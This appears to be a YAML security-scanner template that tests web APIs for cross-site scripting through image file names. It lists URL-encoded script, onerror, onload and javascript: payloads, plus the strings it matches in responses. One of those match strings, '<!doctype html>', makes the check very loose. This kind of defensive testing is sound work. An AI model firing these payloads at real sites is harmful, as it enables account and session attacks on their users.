id: XSS_VIA_FILE_NAME
info:
  name: "XSS by changing file names"
  description: "Testing vulnerability by injecting malicious scripts in filenames to bypass security measures and execute unauthorized code." 
  details: >
            "Security test that aims to identify vulnerabilities in web applications. By injecting malicious scripts into file names, attackers can bypass security measures and execute unauthorized code on the victim's browser."
            "This test helps developers uncover and address potential XSS (Cross-Site Scripting) vulnerabilities, ensuring robust protection against malicious attacks."
  impact: "An XSS vulnerability can have significant impacts, including the potential for data theft, unauthorized access, session hijacking, defacement of web pages, and the injection of malicious content."
  category:
    name: XSS
    shortName: XSS
    displayName: Cross-site scripting (XSS)
  subCategory: XSS_VIA_FILE_NAME
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-community/attacks/xss/"
    - "https://infosecwriteups.com/all-about-file-upload-xss-c72c797aaba3"
  cwe:
    - CWE-79
  cve:
    - CVE-2023-43309
    - CVE-2021-38143

api_selection_filters:
  and:
    response_code:
      gte: 200
      lt: 300

    response_payload:
      length:
        extract: original_length
      contains_either:
        - <!doctype html>

    or:
      - request_payload:
          for_one:
            value:
              contains_either:
                  - .jpg
                  - .jpeg
                  - .png
                  - .gif
                  - .svg
            key:
              extract: jpg_file_name
      - query_param:
          for_one:
            value:
              contains_either:
                  - .jpg
                  - .jpeg
                  - .png
                  - .gif
                  - .svg
            key:
              extract: jpg_file_name

wordLists:
  testPayloads:
    - "%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg"
    - "%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg"
    - "%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png"
    - "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E.jpg"
    - "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E.jpg"
    - "%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E.jpg"
    - "%3Cdiv%20style%3D%22background-image%3Aurl%28javascript%3Aalert%28%27XSS%27%29%29%3B%22%3E.jpg"
    - "%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fiframe%3E.jpg"
    - "jaVasCript%3A%2F%2Falert%28%27XSS%27%29.jpg"

execute:
  type: single
  requests:
    - req:
      - modify_query_param:
          jpg_file_name: "${testPayloads}"
      - modify_body_param:
          jpg_file_name: "${testPayloads}"


validate:
  response_payload:
    contains_either: 
    - "<script>alert(document.domain)</script>"
    - "<!doctype html>"
    - "<script>alert('XSS')</script>"
    - "<img src=x onerror=alert('XSS')>"
    - "<svg/onload=alert('XSS')>"
    - "<div style=\"background-image:url(javascript:alert('XSS'));\">"
    - "<iframe src=\"javascript:alert('XSS')\"></iframe>"
    - "jaVasCript://alert('XSS')"
    - "<scr[null character]ipt>alert('XSS')</script>"
    - "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
    - "jav[horizontal tab]ascript:alert('XSS')"
    - "<script src=data:,alert('XSS')>"
    length:
      neq: ${original_length}